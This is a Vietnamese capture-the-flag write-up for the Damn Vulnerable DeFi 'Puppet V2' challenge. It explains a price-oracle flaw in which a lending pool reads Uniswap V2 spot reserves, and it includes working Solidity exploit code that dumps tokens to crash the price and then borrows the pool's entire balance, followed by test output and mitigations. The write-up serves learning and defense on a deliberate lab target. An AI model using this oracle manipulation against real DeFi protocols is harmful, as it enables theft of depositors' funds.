---
title: "[DVD-09] Puppet V2: thao túng spot reserve Uniswap V2, vay 1 triệu DVT chỉ với ~3 WETH"
description: "PuppetV2Pool tính collateral bằng UniswapV2Library.quote trên spot reserve của pair — không có TWAP. Player dump 10.000 DVT vào pair mỏng (100 DVT/10 WETH), giá sụp ~100.000 lần, rồi vay toàn bộ 1.000.000 DVT của pool với khoản nộp ~3 WETH."
pubDate: 2026-08-25
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "oracle-manipulation"]
draft: true
challenge: "damn-vulnerable-defi"
difficulty: "medium"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Puppet V2 là phiên bản nâng cấp của Puppet nhưng mắc cùng một căn bệnh: oracle lấy giá từ **spot reserve** của một cặp Uniswap V2 mà không có bất kỳ cơ chế chống thao túng nào. Lần này pair chỉ có 100 DVT / 10 WETH, player nắm 10.000 DVT — dump toàn bộ vào pair khiến giá DVT tính theo WETH rơi xuống ~1e-6. Collateral yêu cầu để vay 1.000.000 DVT (hệ số 3) chỉ còn ~3 WETH, trong khi player có sẵn 20 ETH.

## Bối cảnh & Mục tiêu

- **PuppetV2Pool** (`src/puppet-v2/PuppetV2Pool.sol`) — lending pool vay DVT, nhận collateral bằng WETH với `depositFactor = 3`. Khác Puppet bản đầu: collateral được pull qua `transferFrom` thay vì `msg.value`, nên attacker phải approve WETH trước.
- **Uniswap V2 pair** DVT/WETH — nguồn giá cho pool, tạo qua factory và router.

Trạng thái ban đầu (`test/puppet-v2/PuppetV2.t.sol`): pair 100 DVT / 10 WETH (giá 0,1 WETH/DVT → `calculateDepositOfWETHRequired(1 ether) == 0.3 ether`); pool nắm 1.000.000 DVT; player có 10.000 DVT + 20 ETH.

Điều kiện thắng (`_isSolved()`, dòng 131–134): pool hết DVT, recovery nhận đủ 1.000.000 DVT. Không có ràng buộc số giao dịch.

## Phân tích lỗ hổng

Giá được tính tại `src/puppet-v2/PuppetV2Pool.sol:50-61`:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}

// Fetch the price from Uniswap v2 using the official libraries
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

`UniswapV2Library.quote` (src/puppet-v2/UniswapV2Library.sol:49-53) chỉ là phép nhân chia dựa trên reserve tức thời:

```solidity
function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {
    require(amountA > 0, "UniswapV2Library: INSUFFICIENT_AMOUNT");
    require(reserveA > 0 && reserveB > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
    amountB = amountA * reserveB / reserveA;
}
```

Nghĩa là giá = `reserveWETH / reserveToken` tại đúng thời điểm gọi. Vấn đề giống hệt Puppet:

- Không có TWAP, không kiểm tra độ sâu thanh khoản.
- Ai cũng có thể swap trên pair, và swap làm đổi reserve ngay lập tức.
- Vốn thanh khoản 100 DVT / 10 WETH quá mỏng so với 10.000 DVT player cầm.

Hệ số 3 cũng không cứu được pool: giá sụp ~5 bậc độ lớn thì nhân 3 vẫn chẳng thấm vào đâu.

## Khai thác

Toàn bộ exploit nằm trong `test_puppetV2()` (test/puppet-v2/PuppetV2.t.sol:100-126), dùng chính router Uniswap V2:

```solidity
// 1) Dump toàn bộ 10.000 DVT vào pair -> giá DVT/WETH sụp
token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);
uniswapV2Router.swapExactTokensForETH({
    amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
    amountOutMin: 0,
    path: path,
    to: player,
    deadline: block.timestamp
});

// 2) Wrap toàn bộ ETH thành WETH để nộp collateral
weth.deposit{value: player.balance}();

// 3) Vay toàn bộ token của pool với collateral giờ đã rẻ như bèo
uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
weth.approve(address(lendingPool), depositRequired);
lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

// 4) Chuyển token trộm được về recovery
token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
```

Tính toán:

1. **Dump 10.000 DVT**: áp dụng công thức AMM (fee 0,3%), token reserve tăng từ 100 lên ~10.070, WETH reserve co từ 10 về ~0,0099 (tích số không đổi). Giá mới ≈ 9,87e-7 WETH/DVT.
2. **Collateral cho 1.000.000 DVT** = `1.000.000 × 9,87e-7 × 3 ≈ 2,96 WETH`. Player wrap 20 ETH, dư sức trả.
3. `borrow()` pull ~2,96 WETH từ player, chuyển 1.000.000 DVT về player, player gửi hết sang recovery.

## Kết quả

Chạy `forge test --match-path test/puppet-v2/PuppetV2.t.sol`:

```
Ran 2 tests for test/puppet-v2/PuppetV2.t.sol:PuppetV2Challenge
[PASS] test_assertInitialState() (gas: 50329)
[PASS] test_puppetV2() (gas: 247343)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Spot reserve của AMM không phải oracle.** Uniswap V2 có sẵn `UniswapV2Oracle` library tính TWAP tích lũy qua nhiều block — pool nên dùng giá trung bình 30 phút–1 giờ thay vì reserve tức thời.
- **Kiểm tra thanh khoản trước khi định giá:** nếu reserve của pair quá nhỏ so với giá trị khoản vay, phải từ chối hoặc áp dụng mức chiết khấu (haircut) lớn.
- **Phòng ngừa bằng kinh tế học:** hệ số collateral 3x chỉ có ý nghĩa khi biên độ dao động giá thực tế nhỏ hơn hệ số — với oracle spot, biên độ là vô hạn, nên không có hệ số nào đủ an toàn.

## Tham khảo

- Challenge: [Puppet V2 — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/challenges/puppet-v2)
- Source: `src/puppet-v2/PuppetV2Pool.sol`, `src/puppet-v2/UniswapV2Library.sol`, `test/puppet-v2/PuppetV2.t.sol`
